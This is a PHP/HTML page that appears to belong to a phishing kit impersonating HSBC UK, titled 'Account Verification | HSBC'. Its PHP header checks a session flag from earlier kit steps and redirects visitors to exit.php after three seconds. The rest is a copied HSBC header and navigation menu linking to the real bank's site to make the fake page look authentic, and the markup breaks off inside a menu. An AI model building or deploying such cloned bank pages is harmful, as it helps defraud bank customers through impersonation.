<?php
session_start();


if($_SESSION['started'] == 'true'){
	header("Refresh:3; url=exit.php");
}else{
	header('location:exit.php');
}

?>
<!DOCTYPE html>
<html xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" class="dj_gecko dj_contentbox" lang="en">

<head>
    
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    
    <title>Account Verification | HSBC</title>
    

    
    

    <meta name="description" content="">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="author" content="">
    <meta http-equiv="Cache-Control" content="max-age=1,s-maxage=0, no-cache, no-store, must-revalidate, private">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="Sat, 6 May 1995 12:00:00 GMT">

    

    <meta name="epsTriggerId" content="">

    
    <link rel="stylesheet" href="files/css/ursula.css" media="screen">
	<link rel="icon" href="files/img/favicon.ico" type="image/ico">
    
	

</head>

<body class="ursula">

    <div id="top">
        

        
        <div id="mainTopWrapper">
            <div id="mainTopUtility">
                <h1 aria-hidden="true">HSBC</h1>
                <div id="mainTopUtilityRow">
                    <ul id="tabs">
                        <li class="skipLink"><a class="skip" data-dojo-props="target: '#innerPage a:first'" data-dojo-type="hsbcwidget/SkipLink" href="#innerPage" id="skip" target="#innerPage a:first" title="Skip page header and navigation" widgetid="skip" lang="en">Skip page header and navigation</a></li>
                        <li class="on"><a href="https://www.hsbc.co.uk/" aria-selected="true" aria-label="Personal currently selected">Personal</a></li>
                        <li><a href="http://www.business.hsbc.co.uk/" title="Business">Business</a></li>
                    </ul>
                    <div id="siteControls">
                        <div id="langList">
                            <ul>
                                <li class="selected"><a href="#" title="English" lang="en-UK">English</a></li>
                            </ul>
                        </div>
                        <div data-dojo-type="hsbcwidget/Locale" id="locale" widgetid="locale" lang="en">
                            <div data-dojo-props="contentSelector: '#countrySelectorContent'" data-dojo-type="hsbcwidget/DropDown" id="countrySelectorWrapper" widgetid="countrySelectorWrapper" aria-relevant="all" aria-live="polite" lang="en"><a class="dropDownLink trigger" role="tablist" aria-orientation="vertical" href="#countrySelectorContent" title="View list of HSBC Global websites" aria-haspopup="true"><span><span class="flag uk">United Kingdom</span></span></a>
                                <div class="placeholder"></div>
                            </div>
                        </div>
                        <div id="logon" style="display: block;">
                            <ul style="display: none">
                                <li><a href="https://www.security.hsbc.co.uk/gsa/SaaS30Resource/" title="Log on to Personal Internet Banking" class="redBtn"><span>Log on</span></a></li>
                                <li><a href="https://www.hsbc.co.uk/1/2/HSBCINTEGRATION/register" title="Register for Personal Internet Banking" class="greyBtn"><span>Register</span></a></li>
                            </ul>
                        </div>
                        <div data-dojo-type="hsbcwidget/Logon" id="logoff" style="display: none;" widgetid="logoff" lang="en">
                            <ul>
                                <li><a href="https://www.security.hsbc.co.uk/gsa/?idv_cmd=idv.Logoff&amp;nextPage=SaaSLogoutCAM0Resource" title="Log off to Personal Internet Banking" class="redBtn"><span>Log off</span></a></li>
                            </ul>
                        </div>
                        
                    </div>
                </div>
            </div>
            <div id="mainTopNavigation">
                <div id="logo">
                    <a href="https://www.hsbc.co.uk/" title="Home"><img alt="HSBC" src="files/img/hsbc-logo.gif"></a>
                </div>
                <div data-dojo-type="hsbcwidget/DoormatController" id="sections" widgetid="sections" aria-relevant="all" aria-live="polite" lang="en">
                    <nav aria-label="products and services menu">
                        <ul id="topLevel" role="menu" aria-label="products and services menu">
                            <li class="level1" id="dijit__WidgetBase_0" widgetid="dijit__WidgetBase_0"><a tabindex="0" aria-expanded="false" aria-label="Everyday Banking - accounts and services" aria-haspopup="true" class="mainTopNav" id="everydayBanking"><strong>Everyday Banking</strong><br>Accounts
                            &amp; services</a>
                                <div class="doormatWrapper fourColLeft" style="opacity: 0; display: none;" aria-hidden="true">
                                    <div class="arrow">&nbsp;</div>
                                    <div class="doormat">
                                        <p class="skipLink"><a href="#" title="Move to Borrowing navigation">Move to Borrowing
                                        navigation</a></p>
                                        <div class="doormatLeft">
                                            <div class="column">
                                                <h3 aria-hidden="true" class="hidden">HSBC</h3>
                                                <h3><a href="https://www.hsbc.co.uk/current-accounts/" title="Current accounts" data-mobile-="" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/Tab','WT.ti','Doormat:EverydayBanking:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Current
                                                accounts</a></h3>
                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/current-accounts/products/premier/" title="HSBC Premier Account" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/Premier/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:Premier:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
                                                    Premier Account</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/current-accounts/products/advance/" title="HSBC Advance Account" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/Advance/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:Advance:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
                                                    Advance Account</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/current-accounts/products/bank-account/" title="Bank Account" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/BankAccount/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:BankAccount:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Bank
                                                    Account</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/current-accounts/products/student/" title="Students &amp; graduates" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/Student&amp;Graduates/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:Student&amp;Graduates:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Student
                                                    Account</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/current-accounts/switching-to-hsbc/" title="Switching to HSBC" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/SwitchingtoHSBC/Tab','WT.ti','Doormat:EverydayBanking:SwitchingtoHSBC:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Switching
                                                    to HSBC</a></li>
                                                </ul>
                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/current-accounts/" title="View all current accounts" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrentAccounts/ViewAll/Tab','WT.ti','Doormat:EverydayBanking:CurrentAccounts:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">current accounts</span></a></p>
                                                <h3><a href="https://www.hsbc.co.uk/savings/" title="Savings" data-mobile-="" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/SavingsAccounts/Tab','WT.ti','Doormat:SavingsAccounts:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Savings</a></h3>
                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/savings/isas/" title="ISAs" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/ISAs/Tab','WT.ti','Doormat:EverydayBanking:ISAs:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">ISAs</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/savings/products/online-bonus-saver/" title="Online Bonus Saver" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/SavingsAccounts/OBS/Tab','WT.ti','Doormat:SavingsAccounts:OBS:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Online
                                                    Bonus Saver</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/savings/products/flexible-saver/" title="Flexible Saver" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/SavingsAccounts/FlexiSaver/Tab','WT.ti','Doormat:SavingsAccounts:FlexiSaver:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Flexible
                                                    Saver</a></li>
                                                </ul>
                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/savings/" title="View all savings accounts" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/SavingsAccounts/ViewAll/Tab','WT.ti','Doormat:SavingsAccounts:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">savings accounts</span></a></p>
                                            </div>
                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/help/" title="Customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CustomerSupport/Tab','WT.ti','Doormat:EverydayBanking:CustomerSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Customer
                                                support</a></h3>
                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/help/card-support/" title="Card support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CardSupport/Tab','WT.ti','Doormat:EverydayBanking:CardSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Card
                                                    support</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/help/money-worries/" title="Money worries" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CardSupport/Tab','WT.ti','Doormat:EverydayBanking:CardSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Money
                                                    worries</a></li>
                                                </ul>
                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/help/" title="View all customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CustomerSupport/ViewAll/Tab','WT.ti','Doormat:EverydayBanking:CustomerSupport:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">customer support</span></a></p>
                                                <h3><a href="https://www.hsbc.co.uk/ways-to-bank/" title="Ways to bank" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/WaysToBank/Tab','WT.ti','Doormat:EverydayBanking:WaysToBank:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Ways
                                                to bank</a></h3>
                                                <p>Online, phone, mobile or in branch, we make it easy to bank with us.</p>
                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/ways-to-bank/" title="Ways to bank. Find out more." onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/WaysToBank/Tab','WT.ti','Doormat:EverydayBanking:WaysToBank:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Find
                                                out more <span class="hidden" aria-hidden="true">about Ways to bank</span></a></p>
                                            </div>
                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/credit-cards/" title="Credit cards" data-mobile-="" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverdayBanking/CreditCards/Tab','WT.ti','Doormat:CreditCards:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Credit
                                                cards</a></h3>
                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/credit-cards/products/classic/" title="HSBC Credit Card" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CreditCards/HSBCCreditCard/Tab','WT.ti','Doormat:EverydayBanking:CreditCards:HSBCCreditCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
                                                    Credit Card</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/credit-cards/products/premier/" title="HSBC Premier Credit Card" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CreditCards/PremierCreditCard/Tab','WT.ti','Doormat:EverydayBanking:CreditCards:PremierCreditCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
                                                    Premier Credit Card</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/credit-cards/products/student/" title="Student Credit Card" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CreditCards/StudentCreditCard/Tab','WT.ti','Doormat:EverydayBanking:CreditCards:StudentCreditCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Student
                                                    Credit Card</a></li>
                                                </ul>
                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/credit-cards/" title="View all credit cards" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CreditCards/ViewAll/Tab','WT.ti','Doormat:EverydayBanking:CreditCards:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">credit cards</span></a></p>

                                            </div>
                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/international/products/" title="International services" aria-haspopup="true" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/International/Tab','WT.ti','Doormat:EverydayBanking:International:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">International
                                                services</a></h3>
                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/international/currency-account/" title="HSBC Currency Account" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/CurrencyAccount/Tab','WT.ti','Doormat:EverydayBanking:CurrencyAccount:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
                                                    Currency Account</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/international/money-transfer/" title="International Payments" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/IntlMoneyTransfers/Tab','WT.ti','Doormat:EverydayBanking:IntlMoneyTransfers:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">International
                                                    Payments</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/international/travel-money/" title="Travel money" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/TravelMoney/Tab','WT.ti','Doormat:EverydayBanking:TravelMoney:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Travel
                                                    money</a></li>
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/international/overseas-account-opening/" title="Overseas account opening" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/OverseasAccounts/Tab','WT.ti','Doormat:EverydayBanking:OverseasAccounts:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Overseas
                                                    account opening</a></li>
                                                </ul>
                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/international/" title="View all international services" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/EverydayBanking/International/ViewAll/Tab','WT.ti','Doormat:EverydayBanking:International:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">international services</span></a></p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </li>
                            <li class="level1" id="dijit__WidgetBase_1" widgetid="dijit__WidgetBase_1">
                                <a class="mainTopNav" tabindex="0" aria-expanded="false" aria-label="Borrowing - loans and mortgages" aria-haspopup="true" id="borrowing"><strong>Borrowing</strong><br>Loans &amp; mortgages</a>
                                <div class="doormatWrapper fourColLeft" style="opacity: 0; display: none;" aria-hidden="true">
                                    <div class="arrow">&nbsp;</div>

                                    <div class="doormat">
                                        <p class="skipLink"><a href="https://www.hsbc.co.uk/1/2/borrowing" title="Move to Planning &amp; Investing navigation">Move
                                        to Investing navigation</a></p>

                                        <div class="doormatLeft">
                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/loans/" title="Loans" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Loans</a></h3>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/loans/products/personal/" title="Personal Loan" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/PersonalLoan/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:PersonalLoan:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Personal
                                                    Loan</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/loans/products/flexible/" title="FlexiLoan" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/FlexiLoan/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:FlexiLoan:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">FlexiLoan</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/loans/products/premier/" title="HSBC Premier Personal Loan" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/PremierLoan/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:PremierLoan:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Premier
                                                    Personal Loan</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/loans/products/graduate" title="Graduate Loan" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/GraduateLoan/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:GraduateLoan:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Graduate
                                                    Loan</a></li>
                                                </ul>

                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/loans/" title="View all loans" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Loans/ViewAll/Tab','WT.ti','Doormat:Homepage:Borrowing:Loans:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">loans</span></a></p>

                                                <h3><a href="https://www.hsbc.co.uk/credit-cards/" title="Credit cards" onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Credit
                                                cards</a></h3>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/credit-cards/products/classic/" title="Classic Credit Card" onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/HSBCCard/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:HSBCCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Classic
                                                    Credit Card</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/credit-cards/products/premier/" title="HSBC Premier Credit Card" onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/HSBCPremierCard/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:HSBCPremierCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
                                                    Premier Credit Card</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/credit-cards/products/student/" title="Student Visa Credit Card" onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/HSBCStudentCard/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:HSBCStudentCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Student
                                                    Visa Credit Card</a></li>
                                                </ul>

                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/credit-cards/" title="View all credit cards" onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/ViewAll/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">credit cards</span></a></p>
                                            </div>

                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/mortgages/" title="Mortgages" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Mortgages/Tab','WT.ti','Doormat:Homepage:Borrowing:Mortgages:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Mortgages</a></h3>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/mortgages/first-time-buyers/" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/FindAndCompare/Tab','WT.ti','Doormat:Borrowing:FindAndCompare:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">First
                                                    time buyer</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/mortgages/buy-to-let/" title="Buy to let" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/BuyToLet/Tab','WT.ti','Doormat:Borrowing:BuyToLet:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Buy
                                                    to let</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/mortgages/calculators/" title="Mortgage calculators" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/FindAndCompare/Tab','WT.ti','Doormat:Borrowing:FindAndCompare:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Mortgage
                                                    calculators</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/mortgages/existing-customers/" title="Existing customers" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/ExistingMortgageCustomers/Tab','WT.ti','Doormat:Borrowing:ExistingMortgageCustomers:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Existing
                                                    customers</a></li>

                                                </ul>

                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/mortgages/" title="View all mortgages" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/Mortgages/ViewAll/Tab','WT.ti','Doormat:Borrowing:Mortgages:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">mortgages</span></a></p>

                                            </div>

                                            <div class="column">

                                                <h3><a href="https://www.hsbc.co.uk/help" title="Customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/CustomerSupport/Tab','WT.ti','Doormat:Homepage:Borrowing:CustomerSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Customer
                                                support</a></h3>

                                                <ul role="menu">
                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/help/money-worries/managing-your-finances/" title="Taking control of your finances" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/CustomerSupport/TakingControlOfYourFinances/Tab','WT.ti','Doormat:Homepage:Borrowing:CustomerSupport:TakingControlOfYourFinances:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Taking
                                                    control of your finances</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/mortgages/guidance/" title="Buying your first home" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/MortgageFTBGuide/Tab','WT.ti','Doormat:Homepage:Borrowing:MortgageFTBGuide:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Buying
                                                    your first home</a></li>

                                                    <li role="menuitem"><a role="menuitem" href="https://www.hsbc.co.uk/mortgages/guidance/jargon-buster/" title="Mortgage jargon buster" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/MortgageJargonBuster/Tab','WT.ti','Doormat:Homepage:Borrowing:MortgageJargonBuster:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Mortgage
                                                    jargon buster</a></li>
                                                </ul>

                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/help/" title="View all customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/CustomerSupport/ViewAll/Tab','WT.ti','Doormat:Homepage:Borrowing:CustomerSupport:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
                                                all <span class="hidden" aria-hidden="true">customer support</span></a></p>
                                            </div>
                                            <div class="column">
                                                <h3><a href="https://www.hsbc.co.uk/current-accounts/products/overdrafts/" title="Overdraft service" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Overdrafts/Tab','WT.ti','Doormat:Homepage:Borrowing:Overdrafts:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Overdraft
                                                service</a></h3>

                                                <p>Manage your money by agreeing an arranged overdraft facility and keeping within its limit.</p>

                                                <p class="ctaLink"><a href="https://www.hsbc.co.uk/current-accounts/products/overdrafts/" title="Learn more about overdrafts" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/MortgagesRates/ViewAll/Tab','WT.ti','Doormat:Homepage:Borrowing:MortgagesRates:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Learn
                                                more<span class="hidden" aria-hidden="true"> about overdrafts</span></a></p>
                                            </div>
                                        </div>

                                    </div>
                                </div>
                            </li>

                            <li class="level1" id="dijit__WidgetBase_2" widgetid="dijit__WidgetBase_2"><a tabindex="0" aria-expanded="false" aria-label="Investing - products and analysis" aria-haspopup="true" class="mainTopNav" id="Investing"><strong>Investing</strong><br>
                            Products &amp; analysis</a>
                                <div class="doormatWrapper fourColRight" style="opacity: 0; display: none;" aria-hidden="true">
                                    <div class="arrow">&nbsp;</div>

                                    <div class="doormat">
                                        <p class="skipLink"><a href="#" title="Move to Insurance navigation">Move to Insurance
                                        navigation</a></p>

                                        <div class="doormatLeft">
                                            <div class="column">
